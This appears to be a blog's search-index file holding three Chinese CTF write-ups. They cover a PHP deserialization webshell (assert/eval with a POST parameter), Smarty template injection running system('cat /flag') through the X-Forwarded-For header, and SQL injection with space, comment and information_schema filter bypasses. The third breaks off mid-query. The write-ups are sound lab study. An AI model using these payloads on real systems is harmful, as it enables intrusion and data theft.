<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[NPUCTF2020]ReadlezPHP 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BNPUCTF2020%5DReadlezPHP/"/>
    <url>/2023/08/23/2023-08-23-%5BNPUCTF2020%5DReadlezPHP/</url>
    
    <content type="html"><![CDATA[<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>1.打开网站，发现右键无法使用:<br>使用ctrl+u查看网页源代码，在源代码中发现以下文件:</p><p><img src="/images/2023-8-23_ReadlezPHP/image-20230822135141611.png" alt="image-20230822135141611"></p><p>对&#x2F;time.php?source进行访问：</p><p>打开一个新的窗口以后，打开检查，然后在该窗口访问该网站的该文件:<br><a href="http://49df8479-f9e5-48eb-912c-ef29bdd53134.node4.buuoj.cn:81/time.php?source">http://49df8479-f9e5-48eb-912c-ef29bdd53134.node4.buuoj.cn:81/time.php?source</a></p><p>得到php源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br><br><span class="hljs-number">2023</span>-<span class="hljs-number">08</span>-<span class="hljs-number">22</span> <span class="hljs-number">05</span>:<span class="hljs-number">49</span>:<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>对代码进行审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-comment">//只有在申请类时才会被调用，如果类已经被申请，则再次使用该类就不会再调用该函数</span><br>    <span class="hljs-comment">//所以反序列化函数执行不会调用该函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//类被销毁时自动调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">#存在代码执行漏洞</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><span class="hljs-comment">//对source的传值进行过滤</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//反序列化data的传值</span><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><p>我们需要利用的漏洞为HelloPhp类中的echo,所以只需要借助@$ppp &#x3D; unserialize($_GET[“data”]);这串代码即可</p><p>所以我们只需要传参data</p><p>2.测试是否能够调用到echo：<br>构造payload的php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">#存在代码执行漏洞=&gt;system(&quot;ls /&quot;);</span><br>        <span class="hljs-comment">#$b=eval,$a=system(&quot;ls /&quot;)</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">#由于只有申请类</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A11%3A%22Y-m-d+h%3Ai%3As%22%3Bs%3A1%3A%22b%22%3Bs%3A4%3A%22date%22%3B%7D<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A11%3A%22Y-m-d+h%3Ai%3As%22%3Bs%3A1%3A%22b%22%3Bs%3A4%3A%22date%22%3B%7D<br></code></pre></td></tr></table></figure><p>响应结果：</p><p><img src="/images/2023-8-23_ReadlezPHP/image-20230822145253333.png" alt="image-20230822145253333"></p><p>成功执行了echo函数，所以我们现在可以构造恶意执行代码</p><p>3.函数介绍:<br>assert():</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">assert 判断一个表达式是否成立<br>assert()可以将整个字符串参数当作php参数执行<br>assert(&#x27;str&#x27;):该函数可以直接把str放入&lt;?php str ?&gt;中执行<br></code></pre></td></tr></table></figure><p>eval():</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eval()函数和assert()一样都可以执行字符串中的php代码,但是该函数不是将str放入&lt;?php ?&gt;<br></code></pre></td></tr></table></figure><p>4.两者可以配合使用，传入一句话木马:<br>构造payload模板:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">assert(eval($_POST[hacker]););<br>=&gt;<br>&lt;?php<br>eval($_POST[hacker]);<br>?&gt;<br>所以之后echo之后会在当前网页文件上显示出该php代码，然后我们就可以对其进行webshell<br></code></pre></td></tr></table></figure><p>构造payload的php代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">#存在代码执行漏洞=&gt;system(&quot;ls /&quot;);</span><br>        <span class="hljs-comment">#$b=eval,$a=system(&quot;ls /&quot;)</span><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><span class="hljs-variable">$obj</span>-&gt;b=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$obj</span>-&gt;a= <span class="hljs-string">&#x27;eval($_POST[hacker]);&#x27;</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A21%3A%22eval%28%24_POST%5Bhacker%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A21%3A%22eval%28%24_POST%5Bhacker%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D<br><br>POST:<br>hacker=pipinfo();<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_ReadlezPHP/image-20230822153954389.png" alt="image-20230822153954389"></p><p>webshell成功</p><p>先在phpinfo()中(phpinfo()也可以用来测试是否注入成功)寻找flag,如果phpinfo()中没有flag,那再查看网站文件中寻找flag:</p><p><img src="/images/2023-8-23_ReadlezPHP/image-20230822154308711.png" alt="image-20230822154308711"></p><p>flag&#x3D;flag{90087f20-6e76-43d9-a143-7f580b5b3e87} </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华东南赛区]Web11 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"/>
    <url>/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>1.打开网页后观察:</p><p><img src="/images/2023-8-23_Web11/image-20230823120850043.png" alt="image-20230823120850043"></p><p>根据网页显示的内容得，我们可能需要对网页的请求头进行更改</p><p>2.BP抓包:<br><img src="/images/2023-8-23_Web11/image-20230823121029643.png" alt="image-20230823121029643"></p><p>由网页显示的内容得，我们可能需要修改headers中的X-Forwarded-For</p><p>对该字段进行修改，先随便写一个IP：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121206963.png" alt="image-20230823121206963"></p><p>我们输入的内容在网页的Current IP中显示，即我们输入的内容可以被渲染传送到html中显示，所以猜测该字段存在ssti注入</p><p>3.判断是否存在模板注入:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121359664.png" alt="image-20230823121359664"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#123;&#125;&#125;中的代码被执行输出64，所以该字段存在ssti注入<br></code></pre></td></tr></table></figure><p>4.判断该模板的类型:<br>用判断是否为Smarty模板注入:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;$smarty.version&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121632709.png" alt="image-20230823121632709"></p><p>爆出版本信息:3.1.30,所以该网页使用的是smarty模板</p><p>5.使用ssti在Smarty模板中的恶意代码:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121828541.png" alt="image-20230823121828541"></p><p>发现有一个flag文件，查看flag文件的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121932270.png" alt="image-20230823121932270"></p><p>flag&#x3D;flag{0f8c1a6e-bf4c-4d5e-ad9e-f6282d3fe876}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[SWPU2019]Web1 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/"/>
    <url>/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>1.点击网页之后，注册一个账户，然后登录(登录界面和注册界面的sql注入已经测试，发现没有用):<br><img src="/images/2023-08-23_Web1/image-20230823141144322.png" alt="image-20230823141144322"></p><p>2.点击申请一个广告:</p><p><img src="/images/2023-08-23_Web1/image-20230823141243172.png" alt="image-20230823141243172"></p><p>在该页面中也存在疑似注入点，先随机申请一个广告:<br><img src="/images/2023-08-23_Web1/image-20230823141351148.png" alt="image-20230823141351148"></p><p>3.点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823141456102.png" alt="image-20230823141456102"></p><p>显示了该广告的内容</p><p>4.猜测该页面的事务处理逻辑：<br><strong>申请广告页面:</strong></p><p>insert into table VALUES(“广告名”,”广告内容”,……..);</p><p><strong>index.php显示内容：</strong><br>select * from table</p><p><strong>广告详情页面:</strong></p><p>select * from table where 广告名 &#x3D;’从界面列表中获取的广告名’</p><p><strong>验证猜测：</strong></p><p>在申请广告页面中:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">广告名:1&#x27;<br>广告内容:aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823142529330.png" alt="image-20230823142529330"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823142551729.png" alt="image-20230823142551729"></p><p>发生sql报错，所以可以证实我们的猜想，广告详情存在sql注入漏洞:<br>select * from table where 广告名 &#x3D;’1’’</p><p>5.sql注入:<br><strong>第一步，爆字段：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union select 1,2,3 #<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143036837.png" alt="image-20230823143036837"></p><p>发现对输入内容进行了过滤,对输入内容进行判断，看看它过滤了哪些内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143210775.png" alt="image-20230823143210775"></p><p>可以进行申请，但是在显示的内容中空格被消除了，说明网页对空格进行了处理:<br><strong>对空格进行绕过:</strong><br><img src="/images/2023-08-23_Web1/image-20230823143443665.png" alt="image-20230823143443665"></p><p>所以空格可以用&#x2F;**&#x2F;代替</p><p><img src="/images/2023-08-23_Web1/image-20230823144042281.png" alt="image-20230823144042281"></p><p>所以也可以用()绕过空格</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144331977.png" alt="image-20230823144331977"></p><p>没有过滤select</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144539306.png" alt="image-20230823144539306"></p><p>说明该站点过滤了#</p><p><strong>#号绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823145455569.png" alt="image-20230823145455569"></p><p>所以可以用&#x2F;**&#x2F;‘通过闭合’绕过</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823145739643.png" alt="image-20230823145739643"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823145919546.png" alt="image-20230823145919546"></p><p>成功爆出字段不一致的错误，说明当前注入方式正确，现在只要一步步添加上去或减少，来确认它到底有多少字段(也可以用order by 或group by 来判断有多少字段),最终添加到22的时候成功:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823150404948.png" alt="image-20230823150404948"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823150443148.png" alt="image-20230823150443148"></p><p>没有报错，说明当前表总共有22个字段,且由显示的内容得，只显示了2，3，说明该数据表的内容在html中（在数据库中select一定是全部搜索出来的）只显示第二个字段和第三个字段，所以我们要爆的内容也只能在这两个字段中显示</p><p><strong>第二步，爆数据库</strong>：</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823151000019.png" alt="image-20230823151000019"></p><p>爆出数据库只有web1</p><p><strong>第三步，爆表：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables/**/where/**/table_schema=DATABASE()/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152137236.png" alt="image-20230823152137236"></p><p>对输入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152224914.png" alt="image-20230823152224914"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152317844.png" alt="image-20230823152317844"></p><p>猜测敏感词汇为information_schema.tables</p><p><strong>information_schema.tables绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823152947582.png" alt="image-20230823152947582"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153243260.png" alt="image-20230823153243260"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823153322133.png" alt="image-20230823153322133"></p><p>爆出两张表:ads,users</p><p><strong>第四步，爆表的字段：</strong></p><p>先爆ads的字段</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS/**/where table_schema=&#x27;web1&#x27;/**/and/**/table_name=&#x27;ads&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153803945.png" alt="image-20230823153803945"></p><p>对注入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">group_concat(column_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153845408.png" alt="image-20230823153845408"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153914234.png" alt="image-20230823153914234"></p><p>猜测可能是对information_schema.COLUMNS进行了过滤</p><p><strong>information_schema.COLUMNS绕过:</strong></p><p>由于无法绕过information_schema.COLUMNS，但是在已经知道表明的情况下可以采用无列名爆破法:</p><p>参考:[<a href="https://blog.csdn.net/shinygod/article/details/123681039">SWPU2019]Web1 1_succ3的博客-CSDN博客</a></p><p>参考的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">普通的sq查询<br>select * from users<br><br>查询表，并把列名替换为1，2，3.4，5，6<br>select 1,2,3,4,5 ,6 union select * from users<br><br>单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名<br> select `4` from (select 1,2,3,4,5,6 union select * from users)a;<br><br>若反引号被过滤，可以这样<br>select b from (select 1,2,3 as b,4,5 union select * from 